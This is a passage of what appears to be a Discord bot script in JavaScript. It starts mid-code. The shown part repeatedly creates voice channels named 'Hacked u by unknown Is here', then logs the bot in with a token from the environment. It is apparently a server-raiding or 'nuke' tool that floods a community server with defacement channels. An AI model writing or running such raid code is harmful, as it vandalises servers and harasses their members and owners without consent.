m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');



})
}

});

client.login(process.env.BOT_TOKEN); 
